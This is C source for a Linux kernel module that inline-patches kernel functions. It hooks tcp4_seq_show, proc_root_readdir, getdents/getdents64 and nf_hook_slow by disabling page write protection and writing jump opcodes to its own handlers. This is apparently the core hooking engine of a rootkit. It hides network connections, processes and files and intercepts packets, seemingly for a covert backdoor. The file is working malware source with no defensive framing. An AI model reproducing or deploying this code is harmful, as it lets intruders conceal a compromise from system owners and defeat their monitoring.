#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/stop_machine.h>
#include <linux/sched.h>
#include <linux/moduleloader.h>

#include <linux/vmalloc.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/netfilter.h>
#include <linux/netdevice.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/vermagic.h>


#include "config.h"
#include "util.h"

#include "LDasm.h"
#include "rpkt.h"

//#define HOOK_DEBUG


#if (RHEL_MAJOR >= 7 && RHEL_MINOR >= 2)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
// readhat/centos >= 7.2
// Fri Jun 26 2015 Rafael Aquini <aquini@redhat.com> [3.10.0-284.el7]
// int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state)
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state);
#endif

#else

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
// 4.13 - 4.20
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 9, 0)
// 4.13 - 4.10
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, struct nf_hook_entry *entry);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 0, 0)
//  4.9 - 4.1
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 22)
// 4.0 - 2.6.22
extern int ptr_hook_slow(u_int8_t pf, unsigned int hook, struct sk_buff *skb, struct net_device *indev, struct net_device *outdev, int (*okfn)(struct sk_buff *), int thresh);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 10)
// 2.6.22 - 2.6.11
extern int ptr_hook_slow(int pf, unsigned int hook, struct sk_buff **skb, struct net_device *indev, struct net_device *outdev, int (*okfn)(struct sk_buff *), int thresh);
#endif
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 10, 0)
extern int __proc_readdir(struct file *file, struct dir_context *ctx);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
extern int __proc_readdir(struct file *filp, void *dirent, filldir_t filldir);
#endif

// sys_getdents
extern asmlinkage int __getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
// sys_getdents64
extern asmlinkage int __getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);


#define STUB_SIZE 80
//---------------------------------------------------------------------
hook_t _tbl[20];		// hooks array

#define SK_ERR_socket -1
#define SK_ERR_connect -2
typedef struct _hook_ops_t
{
   void (*init)(hook_t *arrHooks, int index, hook_t *_hook);
   int (*new_stub)(void);
   int (*init_addrs)(void);
   int (*init_stub)(void);
   int (*do_hooking)(void);
   int (*unhooking)(void);
} hookops;


void _init(hook_t *arrHooks, int index, hook_t *_hook)
{
	memcpy((arrHooks + index) , _hook , sizeof(hook_t));
}


#define MAX_INDEX	5
void init_func(hookops *_hookops)
{

    hook_t _tcp4_seq_show =
    {
        "tcp4_seq_show",
        NULL,
        v4_seq_show,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };
	
    hook_t _root_readdir =
    {
        "proc_root_readdir",
        NULL,
        __proc_readdir,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

//#if (RHEL_MAJOR >= 7 && RHEL_MINOR >= 2)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)

    hook_t _getdents =
    {	// xxx
        "__x64_sys_getdents",	// __x64_sys_getdents , __ia32_sys_getdents
        NULL,
        __getdents,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

    hook_t _getdents64 =		// __x64_sys_getdents64 , ksys_getdents64
    {
        "ksys_getdents64",
        NULL,
        __getdents64,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };
#else

    hook_t _getdents =
    {
        "sys_getdents",
        NULL,
        __getdents,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

    hook_t _getdents64 =
    {
        "sys_getdents64",
        NULL,
        __getdents64,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };
#endif

    hook_t __hook_slow =
    {
		"nf_hook_slow",
        NULL,
		ptr_hook_slow,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

	// index 0
	_hookops->init(_tbl, 0, &_tcp4_seq_show);
	// index 1
	_hookops->init(_tbl, 1, &_root_readdir);
	// index 2
	_hookops->init(_tbl, 2, &_getdents);
	// index 3
	_hookops->init(_tbl, 3, &_getdents64);
	// index 4
	_hookops->init(_tbl, 4, &__hook_slow);
	
}


#if defined(__i386__)
#define JMP_OPCODE_LEN (1 + 4)
#elif defined(__x86_64__)
#define JMP_OPCODE_LEN (14)

// x64
#define __LP64__ 1
#else

#endif
static inline void patch_jump(void *dst, void *f, void *nf)
{
#if defined(__i386__)
	// JMP opcode -- E9.xx.xx.xx.xx  JMP + 5 + xx.xx.xx.xx
	*((unsigned char *)(dst + 0)) = 0xE9;
	*((int *)(dst + 1)) = (long)(nf - (f + 5));
#elif defined(__x86_64__)

// 0xFF 0x25 0x00000000, 	// 0xFF 0x25 00 00 00 00: JMP [RIP+6]
// xx xx xx xx xx xx xx xx   // Absolute destination address
	*((unsigned char *)(dst + 0)) = 0xFF;
	*((unsigned char *)(dst + 1)) = 0x25;
	*((unsigned char *)(dst + 2)) = 0x00;
	*((unsigned char *)(dst + 3)) = 0x00;
	*((unsigned char *)(dst + 4)) = 0x00;
	*((unsigned char *)(dst + 5)) = 0x00;
	
	*((unsigned long *)(dst + 6)) = (unsigned long)nf;
	
#else

#endif
}


static int init_opcode(hook_t *s)
{
	s->length = 0;
	
	char *src = (char *)s->target;

	uint32_t all_len = 0;
	uint32_t len = 0;
	ldasm_data ld;
	
	do
	{
		len = insn(src, &ld);

		// jmp 0xe9 , 5 szie
		// int3 0xCC,  Near return 0xC3, Far return 0xCB, Near return 0xC2(RET imm16)
		if (ld.flags & F_INVALID
			|| (len == 1 && (src[ld.opcd_offset] == 0xCC || src[ld.opcd_offset] == 0xC3))
			|| (len == 3 && src[ld.opcd_offset] == 0xC2)
			|| (len == 5 && src[ld.opcd_offset] == 0xe9)
			)
		{
			debug(" can't copy instruction!\n");

			return -1;
		}
		
		src += len;
		all_len += len;
		
		if (all_len >= JMP_OPCODE_LEN)
		{
			s->length = all_len;
			
			memcpy(s->stub_bak, s->target, s->length);

			patch_jump(s->stub_bak + s->length, s->stub_bak + s->length, s->target + s->length);
			
			break;
		}
		
	} while (len < 26);

	return 0;
}


int do_hooking(void)
{
	int i;

	hook_t *item = NULL;
	
	if(strstr(UTS_RELEASE, "xen") == NULL )
	{
		GPF_DISABLE
	}

	for (i = 0; i < MAX_INDEX; i++)
	{
		item = &_tbl[i];
		if (item->name == NULL)
			continue;
		debug("--> %s hooking \n", item->name);

		if (atomic_read(&item->usage) == 1)
		{
			if(strstr(UTS_RELEASE, "xen") == NULL ){
				/// GPF_DISABLE
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_rw((unsigned long)item->target_map);
#endif
			}else{
				set_page_rw((unsigned long)item->target_map);
			}

			patch_jump(item->target_map, item->target, item->handler);

			if(strstr(UTS_RELEASE, "xen") == NULL ){
				///GPF_ENABLE
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_ro((unsigned long)item->target_map);
#endif
			}else{
				set_page_ro((unsigned long)item->target_map);
			}

		}
	}
	
	if(strstr(UTS_RELEASE, "xen") == NULL )
	{
		GPF_ENABLE
	}

	return 0;
}


int init_stub(void)
{
	int i;

	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *s = &_tbl[i];

		if (s->name == NULL)
		{
			//debug(" initalize faile \"%s\" \n", s->name);
			continue;
		}

		if (s->target != NULL)
		{
			s->target_map = s->target;
			debug("target:%px   stub:%px \n", s->target_map, s->stub_bak);

			if (s->target_map != NULL && s->stub_bak != NULL)
			{
				if (init_opcode(s) == 0)
				{
					atomic_inc(&s->usage);
					continue;
				} else {
					return -1;
				}
			}
		}
	}
	
	return 0;
}

int init_addrs(void)
{
	int i;

	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *s = &_tbl[i];

		if (s->name == NULL)
			continue;

		s->target = get_symbol_address(s->name);
		debug("get addr %s  %px \n", s->name, s->target);

		if (s->target == NULL)
		{
			return -1;
		}
	}
	
	return 0;
}

int init_hooks(hookops *_hookops)
{
	_hookops->new_stub();

	if(_hookops->init_addrs() < 0)
		return -1;
		
	if(_hookops->init_stub() < 0)
		return -1;

	_hookops->do_hooking();
	
	return 0;
}

int unhooking(void)
{
	int i;
	
	if(strstr(UTS_RELEASE, "xen") == NULL ){
		GPF_DISABLE
	}
	
	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *s = &_tbl[i];
		if (atomic_read(&s->usage))
		{
			if(strstr(UTS_RELEASE, "xen") == NULL ){
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_rw((unsigned long)s->target_map);
#endif
			}else{
				set_page_rw((unsigned long)s->target_map);
			}

			memcpy(s->target_map, s->stub_bak, s->length);

			if(strstr(UTS_RELEASE, "xen") == NULL ){
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_ro((unsigned long)s->target_map);
#endif
			}else{
				set_page_ro((unsigned long)s->target_map);
			}
			
			vfree(s->stub_bak);
		}
	}
	
	if(strstr(UTS_RELEASE, "xen") == NULL ){
		GPF_ENABLE
	}
	

	debug("unhooking \n");

	return 0;
}

void *_new(unsigned long _size)
{
	void *_addr = NULL;
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 27)
#if defined(__i386__)
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM, __pgprot(_PAGE_KERNEL_EXEC));
#elif defined(__x86_64__)
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM, __pgprot(__PAGE_KERNEL_EXEC));
#endif

#else
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM, __pgprot(__PAGE_KERNEL_EXEC));
#endif
	
	return _addr;
}

int new_stub(void)
{
	int i;

	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *se = &_tbl[i];

		se->stub_bak = _new(STUB_SIZE);
		
		memset(se->stub_bak, 0x90, STUB_SIZE);
		debug("+ new stub %px (%s)\n", se->stub_bak, se->name);
	}

	debug("+ new stub ok\n");

	return 0;
}

static hookops g_hookops = {
	_init, 
	new_stub,
	init_addrs,
	init_stub,
	do_hooking,
	unhooking
};

int _true = 0;

int _init1(void)
{
	if(_true != 0)
	{
		return -1;
	}
	
	init_func(&g_hookops);
	
	if(init_hooks(&g_hookops) == 0)
	{
		_true = 1;
		
		return 1;
	}
	
	return -1;
}

void _init2(void)
{
	if(_true == 1)
		g_hookops.unhooking();
}

